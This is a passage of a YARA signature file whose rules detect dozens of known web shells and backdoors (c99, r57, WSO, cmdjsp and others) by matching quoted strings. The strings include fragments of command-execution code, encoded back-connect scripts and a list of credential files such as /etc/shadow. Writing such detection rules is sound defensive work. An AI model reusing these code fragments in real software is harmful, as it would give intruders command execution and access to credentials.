		$s0 = "target fi1e:<br><input type=\"text\" name=\"target\" value=\"index.php\"></br>" fullword
		$s1 = "eval(base64_decode(\"ZXZhbChiYXNlNjRfZGVjb2RlKCJhV2R1YjNKbFgzVnpaWEpmWVdKdmNuUW9"
		$s2 = "<img src=\"http://s43.radikal.ru/i101/1004/d8/ced1f6b2f5a9.png\" align=\"center"
	condition:
		1 of them
}
rule shells_PHP_wso {
	meta:
		description = "Semi-Auto-generated  - file wso.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "33e2891c13b78328da9062fbfcf898b6"
	strings:
		$s0 = "$back_connect_p=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbi"
		$s3 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=pos"
	condition:
		1 of them
}
rule backdoor1_php {
	meta:
		description = "Semi-Auto-generated  - file backdoor1.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "e1adda1f866367f52de001257b4d6c98"
	strings:
		$s1 = "echo \"[DIR] <A HREF=\\\"\".$_SERVER['PHP_SELF'].\"?rep=\".realpath($rep.\".."
		$s2 = "class backdoor {"
		$s4 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?copy=1\\\">Copier un fichier</a> <"
	condition:
		1 of them
}
rule elmaliseker_asp {
	meta:
		description = "Semi-Auto-generated  - file elmaliseker.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "b32d1730d23a660fd6aa8e60c3dc549f"
	strings:
		$s0 = "if Int((1-0+1)*Rnd+0)=0 then makeEmail=makeText(8) & \"@\" & makeText(8) & \".\""
		$s1 = "<form name=frmCMD method=post action=\"<%=gURL%>\">"
		$s2 = "dim zombie_array,special_array"
		$s3 = "http://vnhacker.org"
	condition:
		1 of them
}
rule indexer_asp {
	meta:
		description = "Semi-Auto-generated  - file indexer.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "9ea82afb8c7070817d4cdf686abe0300"
	strings:
		$s0 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ"
		$s2 = "D7nD7l.km4snk`JzKnd{n_ejq;bd{KbPur#kQ8AAA==^#~@%>></td><td><input type=\"submit"
	condition:
		1 of them
}
rule DxShell_php_php {
	meta:
		description = "Semi-Auto-generated  - file DxShell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "33a2b31810178f4c2e71fbdeb4899244"
	strings:
		$s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
		$s2 = "print \"\\n\".'<tr><td width=100pt class=linelisting><nobr>POST (php eval)</td><"
	condition:
		1 of them
}
rule s72_Shell_v1_1_Coding_html {
	meta:
		description = "Semi-Auto-generated  - file s72 Shell v1.1 Coding.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "c2e8346a5515c81797af36e7e4a3828e"
	strings:
		$s0 = "Dizin</font></b></font><font face=\"Verdana\" style=\"font-size: 8pt\"><"
		$s1 = "s72 Shell v1.0 Codinf by Cr@zy_King"
		$s3 = "echo \"<p align=center>Dosya Zaten Bulunuyor</p>\""
	condition:
		1 of them
}
rule hidshell_php_php {
	meta:
		description = "Semi-Auto-generated  - file hidshell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "c2f3327d60884561970c63ffa09439a4"
	strings:
		$s0 = "<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U"
	condition:
		all of them
}
rule kacak_asp {
	meta:
		description = "Semi-Auto-generated  - file kacak.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "907d95d46785db21331a0324972dda8c"
	strings:
		$s0 = "Kacak FSO 1.0"
		$s1 = "if request.querystring(\"TGH\") = \"1\" then"
		$s3 = "<font color=\"#858585\">BuqX</font></a></font><font face=\"Verdana\" style="
		$s4 = "mailto:BuqX@hotmail.com"
	condition:
		1 of them
}
rule PHP_Backdoor_Connect_pl_php {
	meta:
		description = "Semi-Auto-generated  - file PHP Backdoor Connect.pl.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "57fcd9560dac244aeaf95fd606621900"
	strings:
		$s0 = "LorD of IRAN HACKERS SABOTAGE"
		$s1 = "LorD-C0d3r-NT"
		$s2 = "echo --==Userinfo==-- ;"
	condition:
		1 of them
}
rule Antichat_Socks5_Server_php_php {
	meta:
		description = "Semi-Auto-generated  - file Antichat Socks5 Server.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "cbe9eafbc4d86842a61a54d98e5b61f1"
	strings:
		$s0 = "$port = base_convert(bin2hex(substr($reqmessage[$id], 3+$reqlen+1, 2)), 16, 10);" fullword
		$s3 = "#   [+] Domain name address type"
		$s4 = "www.antichat.ru"
	condition:
		1 of them
}
rule Antichat_Shell_v1_3_php {
	meta:
		description = "Semi-Auto-generated  - file Antichat Shell v1.3.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "40d0abceba125868be7f3f990f031521"
	strings:
		$s0 = "Antichat"
		$s1 = "Can't open file, permission denide"
		$s2 = "$ra44"
	condition:
		2 of them
}
rule Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_php {
	meta:
		description = "Semi-Auto-generated  - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "49ad9117c96419c35987aaa7e2230f63"
	strings:
		$s0 = "Welcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy"
		$s1 = "Mode Shell v1.0</font></span>"
		$s2 = "has been already loaded. PHP Emperor <xb5@hotmail."
	condition:
		1 of them
}
rule mysql_php_php {
	meta:
		description = "Semi-Auto-generated  - file mysql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "12bbdf6ef403720442a47a3cc730d034"
	strings:
		$s0 = "action=mysqlread&mass=loadmass\">load all defaults"
		$s2 = "if (@passthru($cmd)) { echo \" -->\"; $this->output_state(1, \"passthru"
		$s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = "
	condition:
		1 of them
}
rule Worse_Linux_Shell_php {
	meta:
		description = "Semi-Auto-generated  - file Worse Linux Shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "8338c8d9eab10bd38a7116eb534b5fa2"
	strings:
		$s1 = "print \"<tr><td><b>Server is:</b></td><td>\".$_SERVER['SERVER_SIGNATURE'].\"</td"
		$s2 = "print \"<tr><td><b>Execute command:</b></td><td><input size=100 name=\\\"_cmd"
	condition:
		1 of them
}
rule cyberlords_sql_php_php {
	meta:
		description = "Semi-Auto-generated  - file cyberlords_sql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "03b06b4183cb9947ccda2c3d636406d4"
	strings:
		$s0 = "Coded by n0 [nZer0]"
		$s1 = " www.cyberlords.net"
		$s2 = "U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAMUExURf///wAAAJmZzAAAACJoURkAAAAE"
		$s3 = "return \"<BR>Dump error! Can't write to \".htmlspecialchars($file);"
	condition:
		1 of them
}
rule cmd_asp_5_1_asp {
	meta:
		description = "Semi-Auto-generated  - file cmd-asp-5.1.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "8baa99666bf3734cbdfdd10088e0cd9f"
	strings:
		$s0 = "Call oS.Run(\"win.com cmd.exe /c del \"& szTF,0,True)" fullword
		$s3 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword
	condition:
		1 of them
}
rule pws_php_php {
	meta:
		description = "Semi-Auto-generated  - file pws.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "ecdc6c20f62f99fa265ec9257b7bf2ce"
	strings:
		$s0 = "<div align=\"left\"><font size=\"1\">Input command :</font></div>" fullword
		$s1 = "<input type=\"text\" name=\"cmd\" size=\"30\" class=\"input\"><br>" fullword
		$s4 = "<input type=\"text\" name=\"dir\" size=\"30\" value=\"<? passthru(\"pwd\"); ?>"
	condition:
		2 of them
}
rule PHP_Shell_php_php {
	meta:
		description = "Semi-Auto-generated  - file PHP Shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "a2f8fa4cce578fc9c06f8e674b9e63fd"
	strings:
		$s0 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input"
		$s1 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type="
	condition:
		all of them
}
rule Ayyildiz_Tim___AYT__Shell_v_2_1_Biz_html {
	meta:
		description = "Semi-Auto-generated  - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "8a8c8bb153bd1ee097559041f2e5cf0a"
	strings:
		$s0 = "Ayyildiz"
		$s1 = "TouCh By iJOo"
		$s2 = "First we check if there has been asked for a working directory"
		$s3 = "http://ayyildiz.org/images/whosonline2.gif"
	condition:
		2 of them
}
rule EFSO_2_asp {
	meta:
		description = "Semi-Auto-generated  - file EFSO_2.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "b5fde9682fd63415ae211d53c6bfaa4d"
	strings:
		$s0 = "Ejder was HERE"
		$s1 = "*~PU*&BP[_)f!8c2F*@#@&~,P~P,~P&q~8BPmS~9~~lB~X`V,_,F&*~,jcW~~[_c3TRFFzq@#@&PP,~~"
	condition:
		2 of them
}
rule lamashell_php {
	meta:
		description = "Semi-Auto-generated  - file lamashell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "de9abc2e38420cad729648e93dfc6687"
	strings:
		$s0 = "lama's'hell" fullword
		$s1 = "if($_POST['king'] == \"\") {"
		$s2 = "if (move_uploaded_file($_FILES['fila']['tmp_name'], $curdir.\"/\".$_FILES['f"
	condition:
		1 of them
}
rule Ajax_PHP_Command_Shell_php {
	meta:
		description = "Semi-Auto-generated  - file Ajax_PHP Command Shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "93d1a2e13a3368a2472043bd6331afe9"
	strings:
		$s1 = "newhtml = '<b>File browser is under construction! Use at your own risk!</b> <br>"
		$s2 = "Empty Command..type \\\"shellhelp\\\" for some ehh...help"
		$s3 = "newhtml = '<font size=0><b>This will reload the page... :(</b><br><br><form enct"
	condition:
		1 of them
}
rule JspWebshell_1_2_jsp {
	meta:
		description = "Semi-Auto-generated  - file JspWebshell 1.2.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "70a0ee2624e5bbe5525ccadc467519f6"
	strings:
		$s0 = "JspWebshell"
		$s1 = "CreateAndDeleteFolder is error:"
		$s2 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.c"
		$s3 = "String _password =\"111\";"
	condition:
		2 of them
}
rule Sincap_php_php {
	meta:
		description = "Semi-Auto-generated  - file Sincap.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "b68b90ff6012a103e57d141ed38a7ee9"
	strings:
		$s0 = "$baglan=fopen(\"/tmp/$ekinci\",'r');"
		$s2 = "$tampon4=$tampon3-1"
		$s3 = "@aventgrup.net"
	condition:
		2 of them
}
rule Test_php_php {
	meta:
		description = "Semi-Auto-generated  - file Test.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "77e331abd03b6915c6c6c7fe999fcb50"
	strings:
		$s0 = "$yazi = \"test\" . \"\\r\\n\";" fullword
		$s2 = "fwrite ($fp, \"$yazi\");" fullword
		$s3 = "$entry_line=\"HACKed by EntriKa\";" fullword
	condition:
		1 of them
}
rule Phyton_Shell_py {
	meta:
		description = "Semi-Auto-generated  - file Phyton Shell.py.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "92b3c897090867c65cc169ab037a0f55"
	strings:
		$s1 = "sh_out=os.popen(SHELL+\" \"+cmd).readlines()" fullword
		$s2 = "#   d00r.py 0.3a (reverse|bind)-shell in python by fQ" fullword
		$s3 = "print \"error; help: head -n 16 d00r.py\"" fullword
		$s4 = "print \"PW:\",PW,\"PORT:\",PORT,\"HOST:\",HOST" fullword
	condition:
		1 of them
}
rule mysql_tool_php_php {
	meta:
		description = "Semi-Auto-generated  - file mysql_tool.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "5fbe4d8edeb2769eda5f4add9bab901e"
	strings:
		$s0 = "$error_text = '<strong>Failed selecting database \"'.$this->db['"
		$s1 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERV"
		$s4 = "<div align=\"center\">The backup process has now started<br "
	condition:
		1 of them
}
rule Zehir_4_asp {
	meta:
		description = "Semi-Auto-generated  - file Zehir 4.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "7f4e12e159360743ec016273c3b9108c"
	strings:
		$s2 = "</a><a href='\"&dosyapath&\"?status=10&dPath=\"&f1.path&\"&path=\"&path&\"&Time="
		$s4 = "<input type=submit value=\"Test Et!\" onclick=\""
	condition:
		1 of them
}
rule sh_php_php {
	meta:
		description = "Semi-Auto-generated  - file sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "330af9337ae51d0bac175ba7076d6299"
	strings:
		$s1 = "$ar_file=array('/etc/passwd','/etc/shadow','/etc/master.passwd','/etc/fstab','/e"
		$s2 = "Show <input type=text size=5 value=\".((isset($_POST['br_st']))?$_POST['br_st']:"
	condition:
		1 of them
}
rule phpbackdoor15_php {
	meta:
		description = "Semi-Auto-generated  - file phpbackdoor15.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "0fdb401a49fc2e481e3dfd697078334b"
	strings:
		$s1 = "echo \"fichier telecharge dans \".good_link(\"./\".$_FILES[\"fic\"][\"na"
		$s2 = "if(move_uploaded_file($_FILES[\"fic\"][\"tmp_name\"],good_link(\"./\".$_FI"
		$s3 = "echo \"Cliquez sur un nom de fichier pour lancer son telechargement. Cliquez s"
	condition:
		1 of them
}
rule phpjackal_php {
	meta:
		description = "Semi-Auto-generated  - file phpjackal.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "ab230817bcc99acb9bdc0ec6d264d76f"
	strings:
		$s3 = "$dl=$_REQUEST['downloaD'];"
		$s4 = "else shelL(\"perl.exe $name $port\");"
	condition:
		1 of them
}
rule sql_php_php {
	meta:
		description = "Semi-Auto-generated  - file sql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "8334249cbb969f2d33d678fec2b680c5"
	strings:
		$s1 = "fputs ($fp, \"# RST MySQL tools\\r\\n# Home page: http://rst.void.ru\\r\\n#"
		$s2 = "http://rst.void.ru"
		$s3 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&"
	condition:
		1 of them
}
rule cgi_python_py {
	meta:
		description = "Semi-Auto-generated  - file cgi-python.py.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "0a15f473e2232b89dae1075e1afdac97"
	strings:
		$s0 = "a CGI by Fuzzyman"
		$s1 = "\"\"\"+fontline +\"Version : \" + versionstring + \"\"\", Running on : \"\"\" + "
		$s2 = "values = map(lambda x: x.value, theform[field])     # allows for"
	condition:
		1 of them
}
rule ru24_post_sh_php_php {
	meta:
		description = "Semi-Auto-generated  - file ru24_post_sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "5b334d494564393f419af745dc1eeec7"
	strings:
		$s1 = "<title>Ru24PostWebShell - \".$_POST['cmd'].\"</title>" fullword
		$s3 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a"
		$s4 = "Writed by DreAmeRz" fullword
	condition:
		1 of them
}
rule DTool_Pro_php {
	meta:
		description = "Semi-Auto-generated  - file DTool Pro.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "366ad973a3f327dfbfb915b0faaea5a6"
	strings:
		$s0 = "r3v3ng4ns\\nDigite"
		$s1 = "if(!@opendir($chdir)) $ch_msg=\"dtool: line 1: chdir: It seems that the permissi"
		$s3 = "if (empty($cmd) and $ch_msg==\"\") echo (\"Comandos Exclusivos do DTool Pro\\n"
	condition:
		1 of them
}
rule telnetd_pl {
	meta:
		description = "Semi-Auto-generated  - file telnetd.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "5f61136afd17eb025109304bd8d6d414"
	strings:
		$s0 = "0ldW0lf" fullword
		$s1 = "However you are lucky :P"
		$s2 = "I'm FuCKeD"
		$s3 = "ioctl($CLIENT{$client}->{shell}, &TIOCSWINSZ, $winsize);#"
		$s4 = "atrix@irc.brasnet.org"
	condition:
		1 of them
}
rule php_include_w_shell_php {
	meta:
		description = "Semi-Auto-generated  - file php-include-w-shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "4e913f159e33867be729631a7ca46850"
	strings:
		$s0 = "$dataout .= \"<td><a href='$MyLoc?$SREQ&incdbhost=$myhost&incdbuser=$myuser&incd"
		$s1 = "if($run == 1 && $phpshellapp && $phpshellhost && $phpshellport) $strOutput .= DB"
	condition:
		1 of them
}
rule Safe0ver_Shell__Safe_Mod_Bypass_By_Evilc0der_php {
	meta:
		description = "Semi-Auto-generated  - file Safe0ver Shell -Safe Mod Bypass By Evilc0der.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "6163b30600f1e80d2bb5afaa753490b6"
	strings:
		$s0 = "Safe0ver" fullword
		$s1 = "Script Gecisi Tamamlayamadi!"
		$s2 = "document.write(unescape('%3C%68%74%6D%6C%3E%3C%62%6F%64%79%3E%3C%53%43%52%49%50%"
	condition:
		1 of them
}
rule shell_php_php {
	meta:
		description = "Semi-Auto-generated  - file shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "1a95f0163b6dea771da1694de13a3d8d"
	strings:
		$s1 = "/* We have found the parent dir. We must be carefull if the parent " fullword
		$s2 = "$tmpfile = tempnam('/tmp', 'phpshell');"
		$s3 = "if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {" fullword
	condition:
		1 of them
}
rule telnet_cgi {
	meta:
		description = "Semi-Auto-generated  - file telnet.cgi.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "dee697481383052980c20c48de1598d1"
	strings:
		$s0 = "www.rohitab.com"
		$s1 = "W A R N I N G: Private Server"
		$s2 = "print \"Set-Cookie: SAVEDPWD=;\\n\"; # remove password cookie"
		$s3 = "$Prompt = $WinNT ? \"$CurrentDir> \" : \"[admin\\@$ServerName $C"
	condition:
		1 of them
}
rule ironshell_php {
	meta:
		description = "Semi-Auto-generated  - file ironshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "8bfa2eeb8a3ff6afc619258e39fded56"
	strings:
		$s0 = "www.ironwarez.info"
		$s1 = "$cookiename = \"wieeeee\";"
		$s2 = "~ Shell I"
		$s3 = "www.rootshell-team.info"
		$s4 = "setcookie($cookiename, $_POST['pass'], time()+3600);"
	condition:
		1 of them
}
rule backdoorfr_php {
	meta:
		description = "Semi-Auto-generated  - file backdoorfr.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "91e4afc7444ed258640e85bcaf0fecfc"
	strings:
		$s1 = "www.victime.com/index.php?page=http://emplacement_de_la_backdoor.php , ou en tan"
		$s2 = "print(\"<br>Provenance du mail : <input type=\\\"text\\\" name=\\\"provenanc"
	condition:
		1 of them
}
rule aspydrv_asp {
	meta:
		description = "Semi-Auto-generated  - file aspydrv.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "1c01f8a88baee39aa1cebec644bbcb99"
		score = 60
	strings:
		$s0 = "If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))"
		$s1 = "password"
		$s2 = "session(\"shagman\")="
	condition:
		2 of them
}
rule cmdjsp_jsp {
	meta:
		description = "Semi-Auto-generated  - file cmdjsp.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "b815611cc39f17f05a73444d699341d4"
	strings:
		$s0 = "// note that linux = cmd and windows = \"cmd.exe /c + cmd\" " fullword
		$s1 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
		$s2 = "cmdjsp.jsp"
		$s3 = "michaeldaw.org" fullword
	condition:
		2 of them
}
rule h4ntu_shell__powered_by_tsoi_ {
	meta:
		description = "Semi-Auto-generated  - file h4ntu shell [powered by tsoi].txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "06ed0b2398f8096f1bebf092d0526137"
	strings:
		$s0 = "h4ntu shell"
		$s1 = "system(\"$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp\");"
	condition:
		1 of them
}
rule Ajan_asp {
	meta:
		description = "Semi-Auto-generated  - file Ajan.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "b6f468252407efc2318639da22b08af0"
	strings:
		$s1 = "c:\\downloaded.zip"
		$s2 = "Set entrika = entrika.CreateTextFile(\"c:\\net.vbs\", True)" fullword
		$s3 = "http://www35.websamba.com/cybervurgun/"
	condition:
		1 of them
}
rule PHANTASMA_php {
	meta:
		description = "Semi-Auto-generated  - file PHANTASMA.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "52779a27fa377ae404761a7ce76a5da7"
	strings:
		$s0 = ">[*] Safemode Mode Run</DIV>"
		$s1 = "$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&see=$file>$file</a><br>"
		$s2 = "[*] Spawning Shell"
		$s3 = "Cha0s"
	condition:
		2 of them
}
rule MySQL_Web_Interface_Version_0_8_php {
	meta:
		description = "Semi-Auto-generated  - file MySQL Web Interface Version 0.8.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "36d4f34d0a22080f47bb1cb94107c60f"
	strings:
		$s0 = "SooMin Kim"
		$s1 = "http://popeye.snu.ac.kr/~smkim/mysql"
		$s2 = "href='$PHP_SELF?action=dropField&dbname=$dbname&tablename=$tablename"
		$s3 = "<th>Type</th><th>&nbspM&nbsp</th><th>&nbspD&nbsp</th><th>unsigned</th><th>zerofi"
	condition:
		2 of them
}
rule simple_cmd_html {
	meta:
		description = "Semi-Auto-generated  - file simple_cmd.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "c6381412df74dbf3bcd5a2b31522b544"
	strings:
		$s1 = "<title>G-Security Webshell</title>" fullword
		$s2 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
		$s3 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
		$s4 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword
	condition:
		all of them
}
rule _1_c2007_php_php_c100_php {
	meta:
		description = "Semi-Auto-generated  - from files 1.txt, c2007.php.php.txt, c100.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash1 = "d089e7168373a0634e1ac18c0ee00085"
		hash2 = "38fd7e45f9c11a37463c3ded1c76af4c"
	strings:
		$s0 = "echo \"<b>Changing file-mode (\".$d.$f.\"), \".view_perms_color($d.$f).\" (\""
		$s3 = "echo \"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"
	condition:
		1 of them
}
rule _nst_php_php_img_php_php_nstview_php_php {
	meta:
		description = "Semi-Auto-generated  - from files nst.php.php.txt, img.php.php.txt, nstview.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "ddaf9f1986d17284de83a17fe5f9fd94"
		hash1 = "17a07bb84e137b8aa60f87cd6bfab748"
		hash2 = "4745d510fed4378e4b1730f56f25e569"
	strings:
		$s0 = "<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><i"
		$s1 = "$perl_proxy_scp = \"IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4v"
		$s2 = "<tr><form method=post><td><font color=red><b>Backdoor:</b></font></td><td><input"
	condition:
		1 of them
}
rule _network_php_php_xinfo_php_php_nfm_php_php {
	meta:
		description = "Semi-Auto-generated  - from files network.php.php.txt, xinfo.php.php.txt, nfm.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "acdbba993a5a4186fd864c5e4ea0ba4f"
		hash1 = "2601b6fc1579f263d2f3960ce775df70"
		hash2 = "401fbae5f10283051c39e640b77e4c26"
	strings:
		$s0 = ".textbox { background: White; border: 1px #000000 solid; color: #000099; font-fa"
		$s2 = "<input class='inputbox' type='text' name='pass_de' size=50 onclick=this.value=''"
	condition:
		all of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php_SpecialShell_99_php_php {
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "09609851caa129e40b0d56e90dfc476c"
	strings:
		$s2 = "echo \"<hr size=\\\"1\\\" noshade><b>Done!</b><br>Total time (secs.): \".$ft"
		$s3 = "$fqb_log .= \"\\r\\n------------------------------------------\\r\\nDone!\\r"
	condition:
		1 of them
}
rule _r577_php_php_SnIpEr_SA_Shell_php_r57_php_php_r57_Shell_php_php_spy_php_php_s_php_php {
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash3 = "8023394542cddf8aee5dec6072ed02b5"
		hash4 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash5 = "817671e1bdc85e04cc3440bbd9288800"
	strings:
		$s2 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner o"
		$s4 = "if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult"
	condition:
		1 of them
}
rule _c99shell_v1_0_php_php_c99php_SsEs_php_php_ctt_sh_php_php {
	meta:
		description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt, ctt_sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash3 = "671cad517edd254352fe7e0c7c981c39"
	strings:
		$s0 = "\"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze\""
		$s2 = "\"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm\""
		$s4 = "\"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo\""
	condition:
		2 of them
}
rule _r577_php_php_spy_php_php_s_php_php {
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash2 = "817671e1bdc85e04cc3440bbd9288800"
	strings:
		$s2 = "echo $te.\"<div align=center><textarea cols=35 name=db_query>\".(!empty($_POST['"
		$s3 = "echo sr(45,\"<b>\".$lang[$language.'_text80'].$arrow.\"</b>\",\"<select name=db>"
	condition:
